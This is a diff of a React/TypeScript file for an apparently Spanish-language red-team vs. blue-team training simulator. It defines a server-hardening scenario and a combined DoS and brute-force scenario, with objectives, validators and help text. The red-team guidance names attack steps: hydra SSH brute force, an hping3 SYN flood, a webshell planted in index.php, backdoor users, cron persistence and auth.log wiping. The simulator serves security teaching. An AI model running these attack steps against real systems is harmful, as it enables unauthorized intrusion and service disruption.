@@ -1,3 +1,4 @@
+
 import React from 'react';
 import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment } from './types';
 
@@ -125,18 +126,14 @@ export const CisoTable: React.FC<{ headers: string[]; rows: (string | React.Reac
 // Simulation Defaults
 // ============================================================================
 
-// FIX: Changed team type to lowercase 'red' | 'blue' to match application-wide types.
 const getInitialPrompt = (team: 'red' | 'blue'): PromptState => {
-    // FIX: Changed comparison to lowercase 'blue'.
     if (team === 'blue') {
         return { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };
     }
     return { user: 'pasante-red', host: 'soc-valtorix', dir: '~' };
 };
 
-// FIX: Changed team type to lowercase 'red' | 'blue' to match application-wide types.
 const getWelcomeMessage = (team: 'red' | 'blue'): TerminalLine[] => [
-    // FIX: Updated string to correctly display team name from lowercase type.
     { text: `Bienvenido a la terminal del Equipo ${team === 'red' ? 'Rojo' : 'Azul'}.`, type: 'output' },
     { html: "Escriba <strong class='text-amber-300'>help</strong> para ver sus objetivos y comandos.", type: 'html' },
 ];
@@ -151,7 +148,6 @@ export const DEFAULT_SIMULATION_STATE = {
     db_config_permissions: '644',
     hydra_run_count: 0,
     server_load: 5.0,
-    // FIX: Changed arguments to lowercase to match new function signatures.
     terminal_output_red: getWelcomeMessage('red'),
     terminal_output_blue: getWelcomeMessage('blue'),
     prompt_red: getInitialPrompt('red'),
@@ -186,11 +182,11 @@ export const GLOSSARY_TERMS: GlossaryTerm[] = [
 export const fortressScenario: InteractiveScenario = {
     id: 'escenario7',
     isInteractive: true,
-    icon: 'shield-check', 
+    icon: 'shield-check',
     color: 'bg-indigo-500',
     title: 'Fortaleza Digital (Hardening vs. Pentest)',
-    subtitle: 'Equipo Rojo vs. Equipo Azul',
-    description: 'El servidor BOVEDA-WEB es vulnerable. El Equipo Azul debe asegurarlo antes de que el Equipo Rojo lo comprometa.',
+    subtitle: 'Equipo Rojo vs. Equipo Azul - Simulación Interactiva',
+    description: 'Rojo debe comprometer el servidor BOVEDA-WEB. Azul debe asegurarlo antes de que sea demasiado tarde. Tiempo estimado: 45 mins.',
     difficulty: 'intermediate',
     team: 'both',
     initialEnvironment: {
@@ -202,21 +198,26 @@ export const fortressScenario: InteractiveScenario = {
                     os: 'linux',
                     services: {
                         22: { name: 'ssh', version: 'OpenSSH 7.4', state: 'open', vulnerabilities: [] },
-                        80: { name: 'http', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [{ cve: 'CVE-2021-CUSTOM', description: 'Weak default config', severity: 'medium' }] },
-                        443: { name: 'https', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [{ cve: 'CVE-2021-SSL', description: 'Weak SSL cipher', severity: 'high' }] },
-                        3306: { name: 'mysql', version: 'MySQL 5.5', state: 'open', vulnerabilities: [] }
+                        80: { name: 'http', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [] },
+                        443: { name: 'https', version: 'Apache 2.4.6', state: 'open', vulnerabilities: [] },
+                        3306: { name: 'mysql', version: 'MySQL 5.5.62', state: 'open', vulnerabilities: [] },
                     },
                     users: [
                         { username: 'root', password: 'toor', privileges: 'root' },
-                        { username: 'blue-team', password: 'SecureP@ss2024!', privileges: 'admin' }
+                        { username: 'admin', password: 'complex_password_!@#$', privileges: 'admin' },
+                        { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' },
                     ],
                     files: [
-                        { path: '/var/www/html/db_config.php', permissions: '644', content: '<?php\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n?>', hash: 'abc123def' },
-                        { path: '/etc/ssh/sshd_config', permissions: '600', content: '#Default Config\nPermitRootLogin yes\n', hash: 'def456abc' }
-                    ]
+                        { path: '/var/log/auth.log', permissions: '640', content: '# Authentication log file\n', hash: 'auth_log_initial' },
+                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "<h1>BOVEDA-WEB v1.0</h1>"; ?>', hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4' },
+                        { path: '/var/www/html/backup/db_config.php.bak', permissions: '644', content: '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n$db_name = "production_db";\n?>', hash: 'backup_config_hash' },
+                        { path: '/var/www/html/db_config.php', permissions: '644', content: '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "mysql_root_pass";\n$db_name = "production_db";\n?>', hash: 'db_config_hash' },
+                        { path: '/etc/ssh/sshd_config', permissions: '600', content: '... PermitRootLogin yes ...', hash: 'sshd_config_hash_7' },
+                    ],
+                    systemState: { cpuLoad: 5.0, memoryUsage: 25.0, networkConnections: 15, failedLogins: 0 }
                 }],
                 firewall: { enabled: false, rules: [] },
-                ids: { enabled: false, signatures: [], alerts: [] }
+                ids: { enabled: true, signatures: ['SSH_BRUTEFORCE'], alerts: [] }
             }
         },
         attackProgress: { reconnaissance: [], compromised: [], credentials: {}, persistence: [] },
@@ -224,44 +225,44 @@ export const fortressScenario: InteractiveScenario = {
         timeline: []
     },
     objectives: [
-        { id: 'blue-firewall', description: 'Activar el firewall UFW y permitir solo SSH y HTTP/HTTPS', points: 20, required: true, validator: (env) => {
-                const fw = env.networks.dmz.firewall;
-                const mysqlRule = fw.rules.find(r => r.destPort === 3306);
-                return fw.enabled && 
-                       fw.rules.some(r => r.action === 'allow' && r.destPort === 22) &&
-                       fw.rules.some(r => r.action === 'allow' && r.destPort === 80) &&
-                       fw.rules.some(r => r.action === 'allow' && r.destPort === 443) &&
-                       (!mysqlRule || mysqlRule.action === 'deny');
-            }, hint: 'Comandos: sudo ufw enable, sudo ufw allow <puerto>, sudo ufw deny <puerto>'
-        },
-        { id: 'blue-ssh-hardening', description: 'Deshabilitar login directo de root en SSH', points: 15, required: true, validator: (env) => {
-                const host = env.networks.dmz.hosts.find(h => h.hostname === 'BOVEDA-WEB');
-                const sshConfig = host?.files.find(f => f.path === '/etc/ssh/sshd_config');
-                return sshConfig?.content?.includes('PermitRootLogin no') ?? false;
-            }, hint: 'Usa "sudo nano /etc/ssh/sshd_config" para editar y "sudo systemctl restart sshd" para aplicar.'
-        },
-        { id: 'blue-file-permissions', description: 'Asegurar db_config.php (permisos 640 o más restrictivos)', points: 15, required: true, validator: (env) => {
-                const host = env.networks.dmz.hosts.find(h => h.hostname === 'BOVEDA-WEB');
-                const dbConfig = host?.files.find(f => f.path === '/var/www/html/db_config.php');
-                return parseInt(dbConfig?.permissions ?? '644', 8) <= parseInt('640', 8);
-            }, hint: 'Comando: sudo chmod 640 /var/www/html/db_config.php'
-        },
-        { id: 'red-reconnaissance', description: 'Escanear BOVEDA-WEB y descubrir servicios vulnerables', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5'), hint: 'Usa nmap con flags -sV y -sC para detectar versiones y vulnerabilidades.'
-        },
-        { id: 'red-bruteforce', description: 'Obtener credenciales SSH de root mediante fuerza bruta', points: 25, required: true, validator: (env) => env.attackProgress.credentials['root@10.0.10.5'] === 'toor', hint: 'Usa hydra con un wordlist contra el servicio SSH.'
-        },
-        { id: 'red-compromise', description: 'Comprometer BOVEDA-WEB completamente (acceso root)', points: 30, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5'), hint: 'Después de obtener credenciales, usa SSH para conectarte.'
-        },
+        // === EQUIPO AZUL ===
+        { id: 'blue-firewall-check', description: 'Diagnóstico: Verificar estado del firewall UFW', points: 5, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('ufw status'))},
+        { id: 'blue-firewall-activate', description: 'Activar UFW con reglas SSH, HTTP, HTTPS (Bloquear 3306)', points: 20, required: true, validator: (env) => {
+            const fw = env.networks.dmz.firewall;
+            const allowedPorts = fw.rules.filter(r => r.action === 'allow').map(r => r.destPort);
+            const sshAllowed = allowedPorts.includes(22);
+            const mysqlAllowed = allowedPorts.includes(3306);
+            return fw.enabled && sshAllowed && !mysqlAllowed;
+        }, hint: '¡CRÍTICO! Permite SSH (22) PRIMERO o te quedarás bloqueado. Luego HTTP (80) y HTTPS (443).'},
+        { id: 'blue-ssh-hardening', description: 'Endurecer SSH: Deshabilitar login directo de root', points: 15, required: true, validator: (env) => !!env.networks.dmz.hosts[0].files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no'), hint: 'Edita /etc/ssh/sshd_config y cambia PermitRootLogin a "no". Reinicia sshd.'},
+        { id: 'blue-file-permissions-check', description: 'Identificar archivos con permisos inseguros (644)', points: 5, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('ls -l'))},
+        { id: 'blue-file-permissions-fix', description: 'Asegurar permisos de db_config.php (640)', points: 15, required: true, validator: (env) => {
+            const file = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/db_config.php');
+            return file ? parseInt(file.permissions) <= 640 : false;
+        }, hint: 'Usa chmod 640 para quitar permisos de lectura a "otros".'},
+        { id: 'blue-monitoring-setup', description: 'Monitoreo activo: Analizar logs de autenticación', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('tail') || log.message.includes('grep')) && log.message.includes('auth.log'))},
+
+        // === EQUIPO ROJO ===
+        { id: 'red-reconnaissance-nmap', description: 'Reconocimiento: Escanear puertos y servicios (Nmap)', points: 10, required: true, validator: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5')},
+        { id: 'red-web-enumeration', description: 'Enumeración Web: Descubrir directorios ocultos (dirb)', points: 5, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('dirb'))},
+        { id: 'red-backup-exfiltration', description: 'Exfiltración: Obtener credenciales de backup expuesto', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('curl') && log.message.includes('backup'))},
+        { id: 'red-bruteforce-ssh', description: 'Acceso Inicial: Fuerza bruta contra SSH (Hydra)', points: 25, required: true, validator: (env) => !!env.attackProgress.credentials['root@10.0.10.5'], hint: 'Usa hydra contra el usuario root. La contraseña es débil.'},
+        { id: 'red-ssh-access', description: 'Compromiso: Acceder al servidor via SSH', points: 20, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.10.5')},
+        { id: 'red-file-exfiltration', description: 'Post-Explotación: Leer archivo de configuración de BD', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('cat') && log.message.includes('db_config.php')) && env.attackProgress.compromised.includes('10.0.10.5')},
+        { id: 'red-backdoor-webshell', description: 'Persistencia: Instalar Webshell en index.php', points: 35, required: true, validator: (env) => {
+             const index = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/index.php');
+             return index?.hash !== '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4';
+        }, hint: 'Modifica index.php para inyectar código PHP malicioso.'},
+        { id: 'red-persistence-user', description: '(Bonus) Crear usuario backdoor', points: 10, required: false, validator: (env) => env.networks.dmz.hosts[0].users.some(u => u.username === 'backdoor')},
+        { id: 'red-persistence-cron', description: '(Bonus) Persistencia via Cron', points: 5, required: false, validator: (env) => env.attackProgress.persistence.includes('cron_job_set')},
     ],
     hints: [
-        { trigger: (env) => env.timeline.filter(log => log.message.includes('hydra')).length > 5, message: '🚨 [EQUIPO AZUL] ¡Ataque de fuerza bruta detectado! Revisa los logs de autenticación y bloquea la IP de origen con UFW.' },
-        { trigger: (env) => {
-            const sshSecured = env.networks.dmz.hosts[0]?.files.find(f => f.path === '/etc/ssh/sshd_config')?.content?.includes('PermitRootLogin no');
-            return env.timeline.length > 10 && !sshSecured;
-          }, message: '💡 [EQUIPO AZUL] Tip: El login directo de root es una vulnerabilidad crítica. Desactívalo en /etc/ssh/sshd_config.'
-        }
+        { trigger: (env) => !env.networks.dmz.firewall.enabled && env.timeline.length > 10, message: '🚨 [EQUIPO AZUL] ALERTA CRÍTICA: El firewall sigue desactivado. Todos los puertos están expuestos.' },
+        { trigger: (env) => env.attackProgress.reconnaissance.includes('10.0.10.5') && !env.networks.dmz.firewall.enabled, message: '⚠️ [EQUIPO AZUL] Escaneo detectado. Activa el firewall AHORA.' },
+        { trigger: (env) => (env.networks.dmz.hosts[0].systemState?.failedLogins ?? 0) > 10, message: '🚨 [EQUIPO AZUL] Ataque de fuerza bruta masivo en SSH. Revisa /var/log/auth.log.' },
+        { trigger: (env) => !!env.attackProgress.credentials['root@10.0.10.5'] && !env.attackProgress.compromised.includes('10.0.10.5'), message: '💡 [EQUIPO ROJO] Tienes las credenciales. Conéctate ahora: ssh root@BOVEDA-WEB' },
     ],
-    evaluation: (env) => ({ completed: false, score: 0, feedback: [] }) // Simplified for now
+    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
 };
 
 const calculateResponseTime = (env: VirtualEnvironment): string => {
@@ -283,8 +284,8 @@ export const rageScenario: InteractiveScenario = {
     icon: 'bomb',
     color: 'bg-orange-600',
     title: 'Furia en la Red: Ataque Combinado',
-    subtitle: 'Equipo Rojo vs. Equipo Azul',
-    description: 'DoS + Bruteforce simultáneos. Azul debe priorizar y contener bajo presión.',
+    subtitle: 'DoS + Bruteforce Simultáneos',
+    description: 'Alerta crítica: PORTAL-WEB reporta timeout. Tráfico anómalo detectado. Azul debe priorizar y contener. Tiempo estimado: 60 mins.',
     difficulty: 'advanced',
     team: 'both',
     
@@ -305,7 +306,8 @@ export const rageScenario: InteractiveScenario = {
                         { username: 'blue-team', password: 'Bl#3T3@m!2024', privileges: 'admin' }
                     ],
                     files: [
-                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "PORTAL-WEB v1.0"; ?>', hash: 'original_hash_123' }
+                        { path: '/var/www/html/index.php', permissions: '644', content: '<?php echo "PORTAL-WEB v1.0"; ?>', hash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4' },
+                        { path: '/var/log/auth.log', permissions: '640', content: '', hash: 'auth_log_initial' }
                     ],
                     systemState: {
                         cpuLoad: 5.0,
@@ -335,69 +337,60 @@ export const rageScenario: InteractiveScenario = {
     },
     
     objectives: [
-        // === EQUIPO ROJO ===
-        { id: 'red-dos-attack', description: 'Lanzar ataque DoS contra PORTAL-WEB (CPU > 90%)', points: 20, required: true, validator: (env) => {
-                const host = env.networks.dmz.hosts.find(h => h.hostname === 'PORTAL-WEB');
-                return (host?.systemState?.cpuLoad ?? 0) > 90;
-            }, hint: 'Usa hping3 con flag --flood -S para SYN flood'
-        },
-        { id: 'red-bruteforce-success', description: 'Obtener credenciales de admin mientras el DoS está activo', points: 30, required: true, validator: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'], hint: 'Lanza hydra con wordlist rockyou.txt mientras el DoS cubre tu rastro'
-        },
-        { id: 'red-deploy-backdoor', description: 'Acceder al servidor y modificar index.php (webshell)', points: 35, required: true, validator: (env) => {
-                const host = env.networks.dmz.hosts.find(h => h.hostname === 'PORTAL-WEB');
-                const indexFile = host?.files.find(f => f.path === '/var/www/html/index.php');
-                return indexFile?.hash !== 'original_hash_123';
-            }, hint: 'Después de SSH, usa nano para editar /var/www/html/index.php y cambiar su contenido'
-        },
-        
         // === EQUIPO AZUL ===
-        { id: 'blue-detect-dos', description: 'Identificar el ataque DoS analizando la carga del sistema', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('top') || log.message.includes('htop'))), hint: 'Usa "top" o "htop" para ver la carga del CPU'
-        },
-        { id: 'blue-detect-bruteforce', description: 'Identificar el ataque de fuerza bruta en logs', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('journalctl') || log.message.includes('grep'))), hint: 'Revisa /var/log/auth.log o usa "journalctl -u sshd"'
-        },
-        { id: 'blue-block-attacker', description: 'Bloquear la IP del atacante en el firewall', points: 25, required: true, validator: (env) => env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100'), hint: 'Usa "sudo ufw deny from <IP>" o fail2ban'
-        },
-        { id: 'blue-verify-integrity', description: 'Verificar integridad de archivos web (detectar backdoor)', points: 20, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('sha256sum') || log.message.includes('md5sum'))), hint: 'Usa "sha256sum /var/www/html/index.php" y compara con hash original'
-        },
+        { id: 'blue-dos-detection', description: 'Diagnóstico: Identificar DoS (CPU > 90%)', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('top') || log.message.includes('htop'))), hint: 'Usa "top" o "htop" para diagnosticar la lentitud.'},
+        { id: 'blue-identify-source', description: 'Investigación: Identificar IP del atacante', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('netstat') || log.message.includes('ss '))), hint: 'Usa "ss -ant" o "netstat" para ver conexiones masivas.'},
+        { id: 'blue-bruteforce-detection', description: 'Detección: Descubrir ataque SSH paralelo en logs', points: 10, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('tail') || log.message.includes('grep') || log.message.includes('journalctl')) && (log.message.includes('auth.log') || log.message.includes('sshd'))), hint: 'El DoS es una distracción. Revisa /var/log/auth.log.'},
+        { id: 'blue-block-attacker', description: 'Contención: Bloquear IP atacante (Detiene DoS y SSH)', points: 25, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('192.168.1.100'), hint: 'Bloquea la IP 192.168.1.100 usando UFW.'},
+        { id: 'blue-verify-compromise', description: 'Evaluación de Daños: Verificar sesiones activas', points: 15, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('who') || log.message.includes('w '))), hint: 'Usa "who" o "w" para ver si el atacante sigue conectado.'},
+        { id: 'blue-file-integrity', description: 'Integridad: Verificar archivos web (backdoor)', points: 20, required: true, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && (log.message.includes('sha256sum') || log.message.includes('md5sum'))), hint: 'Verifica el hash de index.php.'},
+        { id: 'blue-eradication', description: 'Erradicación: Restaurar sistema y eliminar backdoors', points: 25, required: true, validator: (env) => {
+             const index = env.networks.dmz.hosts[0].files.find(f => f.path === '/var/www/html/index.php');
+             return index?.hash === '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4';
+        }},
+        { id: 'blue-fail2ban', description: '(Bonus) Instalar Fail2Ban', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'blue' && log.message.includes('systemctl restart fail2ban'))},
+
+        // === EQUIPO ROJO ===
+        { id: 'red-dos-launch', description: 'Distracción: Lanzar DoS (Hping3)', points: 20, required: true, validator: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 90, hint: 'Usa hping3 con flag --flood -S para saturar el servidor.'},
+        { id: 'red-bruteforce-parallel', description: 'Infiltración: Fuerza bruta paralela (mientras DoS activo)', points: 30, required: true, validator: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'], hint: 'Aprovecha el caos. Lanza hydra mientras el DoS corre.'},
+        { id: 'red-ssh-access', description: 'Acceso: Entrar como admin', points: 15, required: true, validator: (env) => env.attackProgress.compromised.includes('10.0.20.10'), hint: 'ssh admin@PORTAL-WEB usando la contraseña obtenida.'},
+        { id: 'red-webshell-deploy', description: 'Persistencia: Desplegar Webshell/Backdoor', points: 35, required: true, validator: (env) => env.attackProgress.persistence.includes('webshell') || env.attackProgress.persistence.includes('index_modified'), hint: 'Crea un archivo PHP malicioso o modifica index.php.'},
+        { id: 'red-persistence-advanced', description: '(Bonus) Múltiple persistencia (User/Cron)', points: 15, required: false, validator: (env) => env.attackProgress.persistence.length >= 2},
+        { id: 'red-cover-tracks', description: '(Bonus) Limpiar logs', points: 10, required: false, validator: (env) => env.timeline.some(log => log.source_team === 'red' && log.message.includes('echo') && log.message.includes('auth.log'))},
     ],
     
     hints: [
-        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 70, message: '🚨 [EQUIPO AZUL] CPU crítica! Ejecuta "top" inmediatamente para diagnosticar.' },
-        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.failedLogins ?? 0) > 10, message: '⚠️ [EQUIPO AZUL] Múltiples intentos de login fallidos detectados. Revisa logs AHORA.' },
+        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.cpuLoad ?? 0) > 90, message: '🚨 [EQUIPO AZUL] CPU crítica (99%). Servicio web no responde. ¿Ataque DoS?' },
+        { trigger: (env) => (env.networks.dmz.hosts[0]?.systemState?.failedLogins ?? 0) > 20, message: '🚨 [EQUIPO AZUL] Múltiples fallos de SSH detectados en logs. ¡El DoS es una distracción!' },
         { trigger: (env) => {
             const hasCredentials = !!env.attackProgress.credentials['admin@10.0.20.10'];
             const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
             return hasCredentials && !isBlocked;
-          }, message: '🔴 [EQUIPO AZUL] ALERTA CRÍTICA: Credenciales comprometidas. Bloquea la IP INMEDIATAMENTE.'
+          }, message: '⚠️ [EQUIPO AZUL] Credenciales comprometidas y atacante NO bloqueado. Situación crítica.'
         },
+        { trigger: (env) => !!env.attackProgress.credentials['admin@10.0.20.10'] && !env.attackProgress.compromised.includes('10.0.20.10'), message: '💡 [EQUIPO ROJO] Contraseña obtenida. Entra rápido antes de que te bloqueen.' },
     ],
     
     evaluation: (env) => {
-        const redPoints = ['red-dos-attack', 'red-bruteforce-success', 'red-deploy-backdoor'].reduce((sum, id) => {
-            const obj = rageScenario.objectives.find(o => o.id === id);
-            return sum + (obj?.validator(env) ? obj.points : 0);
-        }, 0);
-        const bluePoints = ['blue-detect-dos', 'blue-detect-bruteforce', 'blue-block-attacker', 'blue-verify-integrity'].reduce((sum, id) => {
-            const obj = rageScenario.objectives.find(o => o.id === id);
-            return sum + (obj?.validator(env) ? obj.points : 0);
-        }, 0);
+        const redPoints = rageScenario.objectives.filter(o => o.id.startsWith('red-') && (o as any).validator(env)).reduce((sum, o) => sum + o.points, 0);
+        const bluePoints = rageScenario.objectives.filter(o => o.id.startsWith('blue-') && (o as any).validator(env)).reduce((sum, o) => sum + o.points, 0);
         
         const feedback: string[] = [];
         const isCompromised = env.attackProgress.compromised.includes('10.0.20.10');
         const isBlocked = env.networks.dmz.firewall.rules.some(r => r.action === 'deny' && r.sourceIP === '192.168.1.100');
         
         if (isCompromised && !isBlocked) {
-            feedback.push('⚔️ **VICTORIA DECISIVA DEL EQUIPO ROJO**');
+            feedback.push('⚔️ **VICTORIA DECISIVA DEL EQUIPO ROJO**: Servidor comprometido y persistencia establecida.');
         } else if (isBlocked && !isCompromised) {
-            feedback.push('🛡️ **VICTORIA DEL EQUIPO AZUL**');
+            feedback.push('🛡️ **VICTORIA DEL EQUIPO AZUL**: Ataque mitigado antes del compromiso.');
         } else if (isCompromised && isBlocked) {
-            feedback.push('⚖️ **ESCENARIO MIXTO**');
+            feedback.push('⚖️ **EMPATE TÁCTICO**: Rojo entró, pero Azul lo contuvo eventualmente.');
         } else {
-            feedback.push('📊 **ESCENARIO INCOMPLETO**');
+            feedback.push('📊 **ESCENARIO EN PROGRESO**');
         }
-        feedback.push(`\n**Puntuación:** Rojo ${redPoints}/85 | Azul ${bluePoints}/65`);
+        feedback.push(`\n**Puntuación Final:** Rojo ${redPoints} | Azul ${bluePoints}`);
         if (isBlocked) {
-            feedback.push(`✓ Atacante bloqueado (Tiempo de respuesta: ${calculateResponseTime(env)})`);
+            feedback.push(`✓ Tiempo de respuesta (Bloqueo): ${calculateResponseTime(env)}`);
         }
         return { completed: redPoints >= 70 || bluePoints >= 60, score: Math.max(redPoints, bluePoints), feedback };
     }
@@ -801,7 +794,7 @@ Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (
   <strong class="text-amber-300">sudo ss -tulnp</strong>               - Muestra servicios escuchando en puertos.
   <strong class="text-amber-300">grep "Failed" /var/log/auth.log</strong> - Busca intentos de login fallidos.
   <strong class="text-amber-300">journalctl -u sshd</strong>       - Revisa logs del servicio SSH.
-  <strong class="text-amber-300">openssl s_client -connect [host]:443</strong> - Valida el certificado SSL/TLS.
+  <strong class="text-amber-300">tail -f [file]</strong>           - Monitorea logs en tiempo real.
 
 <strong>Fase 3: Respuesta a Incidentes</strong>
   <strong class="text-amber-300">fail2ban-client banip [ip]</strong> - Simula un baneo manual de IP.
@@ -821,41 +814,39 @@ El orden es crítico.
 
 1.  <strong>Activar Firewall (UFW):</strong> Es tu primera línea de defensa.
     <strong class="text-amber-300">sudo ufw status</strong>      (Verifica que está inactivo)
-    <strong class="text-amber-300">sudo ufw allow ssh</strong>     (¡CRÍTICO! O te quedarás fuera)
-    <strong class="text-amber-300">sudo ufw allow http</strong>      (Permite el tráfico web)
+    <strong class="text-amber-300">sudo ufw allow 22/tcp</strong>  (¡CRÍTICO! SSH primero o te quedarás fuera)
+    <strong class="text-amber-300">sudo ufw allow 80/tcp</strong>  (HTTP)
+    <strong class="text-amber-300">sudo ufw allow 443/tcp</strong> (HTTPS)
     <strong class="text-amber-300">sudo ufw enable</strong>        (¡Actívalo!)
 
 2.  <strong>Asegurar SSH:</strong> Deshabilita el login directo de 'root'.
-    <strong class="text-amber-300">sudo nano /etc/ssh/sshd_config</strong>  (Simula la edición, cambiarás PermitRootLogin a 'no')
+    <strong class="text-amber-300">sudo nano /etc/ssh/sshd_config</strong>  (Cambia PermitRootLogin a 'no')
     <strong class="text-amber-300">sudo systemctl restart sshd</strong> (Aplica los cambios)
 
 3.  <strong>Principio de Menor Privilegio:</strong> Protege archivos sensibles.
-    <strong class="text-amber-300">ls -l /var/www/html/db_config.php</strong> (Verás permisos peligrosos como 644)
-    <strong class="text-amber-300">sudo chmod 640 /var/www/html/db_config.php</strong>  (Quita permisos de lectura a 'otros')
+    <strong class="text-amber-300">ls -l /var/www/html/db_config.php</strong> (Verás permisos 644 inseguros)
+    <strong class="text-amber-300">sudo chmod 640 /var/www/html/db_config.php</strong>  (Solo dueño/grupo leen)
 
 4.  <strong>Monitoreo Activo:</strong> Caza al Equipo Rojo.
-    <strong class="text-amber-300">grep "Failed" /var/log/auth.log</strong> (Ejecuta esto repetidamente mientras el Equipo Rojo
-                           usa 'hydra' para ver los ataques en tiempo real)
-    <strong class="text-amber-300">sudo ss -tulnp</strong>       (Verifica qué puertos están abiertos. Deberían ser
-                           menos después de activar el firewall)
+    <strong class="text-amber-300">tail -f /var/log/auth.log</strong> (Monitoreo en tiempo real de ataques SSH)
 </pre>`,
     red: `<pre class="whitespace-pre-wrap font-mono text-xs">
 <strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
 Tu misión es encontrar una ventana de oportunidad antes de que el Equipo Azul la cierre.
 
 1.  <strong>Reconocimiento:</strong> ¿Qué está abierto?
-    <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong> (Si el firewall está apagado, verás muchos
-                           puertos. Si está encendido, solo los permitidos)
+    <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong> (Busca puertos abiertos como 3306 MySQL)
 
-2.  <strong>Intento de Fuerza Bruta:</strong> El ataque más ruidoso.
-    <strong class="text-amber-300">hydra -l root -P rockyou.txt ssh://BOVEDA-WEB</strong> (Esto SOLO FUNCIONARÁ si el Equipo Azul no ha
-                           asegurado SSH para deshabilitar el login de root)
-                           Si tienes éxito, entra con <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>
+2.  <strong>Enumeración Web:</strong>
+    <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca /backup)
+    <strong class="text-amber-300">curl http://BOVEDA-WEB/backup/db_config.php.bak</strong> (¡Info leak!)
 
-3.  <strong>Explotación Web (Simulada):</strong>
-    <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca directorios. ¿Hay un /backup?)
-    <strong class="text-amber-300">curl http://BOVEDA-WEB/db_config.php</strong> (Si los permisos no han sido
-                                     corregidos, podrías leer el archivo)
+3.  <strong>Ataque de Fuerza Bruta:</strong>
+    <strong class="text-amber-300">hydra -l root -P wordlist.txt ssh://BOVEDA-WEB</strong> (Solo si root login está activo)
+
+4.  <strong>Persistencia:</strong>
+    Si logras entrar: <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>
+    Modifica el índice: <strong class="text-amber-300">nano /var/www/html/index.php</strong>
 </pre>`
   },
  'escenario8': {
@@ -868,45 +859,33 @@ Ataque combinado contra <strong class="text-cyan-300">PORTAL-WEB</strong>. El tr
 Estás bajo un doble ataque. Debes diagnosticar y mitigar ambas amenazas.
 
 1.  <strong>Diagnóstico Inicial:</strong> ¿Qué está pasando?
-    <strong class="text-amber-300">top</strong>                 (El sistema está lento. Verás una carga de CPU del 99%.
-                          Esto indica un posible DoS o un proceso descontrolado).
-    <strong class="text-amber-300">journalctl -u sshd</strong>    (Verás cientos de "Failed password for admin".
-                          Esto es un ataque de fuerza bruta. Anota la IP de origen).
+    <strong class="text-amber-300">top</strong>                 (Verás CPU al 99%. Significa DoS).
+    <strong class="text-amber-300">netstat -an | grep ':80'</strong> (Verifica conexiones masivas).
+    <strong class="text-amber-300">tail -f /var/log/auth.log</strong> (Busca "Failed password". Eso es bruteforce).
 
 2.  <strong>Mitigación Inmediata:</strong> ¡Detén el sangrado!
-    <strong class="text-amber-300">sudo ufw deny from [IP_ATACANTE]</strong> (Bloquea la IP que encontraste en los
-                                      logs. Esto detendrá AMBOS ataques).
-    <strong class="text-amber-300">fail2ban-client set sshd banip [IP_ATACANTE]</strong> (Alternativa que simula
-                                                    un baneo automático).
-    Vuelve a ejecutar <strong class="text-amber-300">top</strong>. La carga debería normalizarse.
